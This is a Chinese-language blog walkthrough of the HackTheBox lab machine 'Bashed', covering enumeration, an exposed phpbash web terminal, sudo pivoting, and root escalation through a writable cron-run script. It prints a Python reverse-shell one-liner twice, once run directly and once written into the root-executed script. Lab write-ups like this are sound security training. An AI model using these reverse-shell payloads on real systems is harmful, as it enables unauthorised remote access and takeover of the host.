---
title: Bashed
date: 2021-10-14
swiper: false # 将改文章放入轮播图中
swiperImg: '/medias/1.jpg' # 该文章在轮播图中的图片，可以是本地目录下图片也可以是http://xxx图片
img: 'http://cdn.mxrblog.cn/ct_3.jpg' # 该文章图片，可以是本地目录下图片也可以是http://xxx图片
categories: walkthrough
tags: [渗透测试, 靶机]
top: false
---



# Bashed

- **bashed是hackthebox上面难度为easy的靶机**

### 信息收集

- 发现开启的端口只有80端口，开启了http服务

![image-20211012124657126](http://cdn.mxrblog.cn/image-20211012124657126.png)

- 打开http://10.10.10.68，查看发现有一个网站

![image-20211012124933106](http://cdn.mxrblog.cn/image-20211012124933106.png)

- 这个网站介绍了工具phpbash的用法

![image-20211012125015175](http://cdn.mxrblog.cn/image-20211012125015175.png)

- 对网站的目录进行检索

- 先使用工具gobuster对网站的目录进行检索

![image-20211012130512392](http://cdn.mxrblog.cn/image-20211012130512392.png)

- 使用dobuster和dirsearch查看这些目录时，发现里面没有什么具有价值的东西

- 在网页上直接进入这些目录，发现http://10.10.10.68/dev/ 下有东西

![image-20211012132012258](http://cdn.mxrblog.cn/image-20211012132012258.png)

- 根据网站的内容介绍，我们可以知道这个phpbash是一个网页版终端，我们点进去，果然有一个终端，在里面搜索，发现了user.txt文件
- 查看内容：

![image-20211012132207011](http://cdn.mxrblog.cn/image-20211012132207011.png)

- 使用python脚本反弹shell

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.23",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

- 获取交互式shell

`python -c 'import pty; pty.spawn("/bin/bash")'`

- 使用sudo -l 会发现我们可以使用sudo 命令执行有关scriptmanager用户的命令，于是使用命令

`sudo -i -u scriptmanager`

- 此时我们使用命令`whoami` 会发现我们已经切换好用户了
- 进入/scripts目录，会发现有test.py和test.txt文件，查看权限知道是root权限，但是scriptmanager用户也可以执行，向text.py文件中输入反向shell代码，在kali机器中打开nc监听

`echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.23",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' > text.py`

- 已经有root权限，并且找到root.txt文件



![image-20211012140758292](http://cdn.mxrblog.cn/image-20211012140758292.png)

